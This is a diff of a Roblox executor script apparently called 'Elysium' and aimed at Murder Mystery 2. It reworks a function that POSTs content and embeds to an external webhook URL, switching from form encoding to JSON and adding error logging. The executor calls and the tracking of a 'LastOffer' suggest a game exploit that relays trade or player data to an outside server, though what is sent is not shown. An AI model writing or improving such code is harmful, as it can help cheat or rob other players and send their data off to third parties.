@@ -70,7 +70,7 @@ task.spawn(function()
 end)
 
 if _G.__ElysiumMM2 then
-	print("already running")
+	warn("[Elysium] already running")
 
 	return
 end
@@ -80,7 +80,8 @@ _G.LastOffer = nil
 pcall(function()
 end)
 
-local function v32()
+local function v32(...)
+	warn("[Elysium]", ...)
 end
 
 v32("Executor: " .. tostring(identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "unknown"))
@@ -967,22 +968,31 @@ local function v251(p21, p22, p23)
 		return
 	end
 
+	local payload = {
+		content = p22 or "",
+		embeds = p23 or {}
+	}
+
 	local ok4, result4 = pcall(function()
-		return "content=" .. HttpService:UrlEncode(p22 or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(p23 or {}))
+		return HttpService:JSONEncode(payload)
 	end)
 
 	if not ok4 then
 		return
 	end
 
-	pcall(request_, {
+	local success, err = pcall(request_, {
 		Url = p21,
 		Method = "POST",
 		Headers = {
-			["Content-Type"] = "application/x-www-form-urlencoded"
+			["Content-Type"] = "application/json"
 		},
 		Body = result4
 	})
+
+	if not success then
+		v32("Webhook error: " .. tostring(err))
+	end
 end
 
 local function v262()
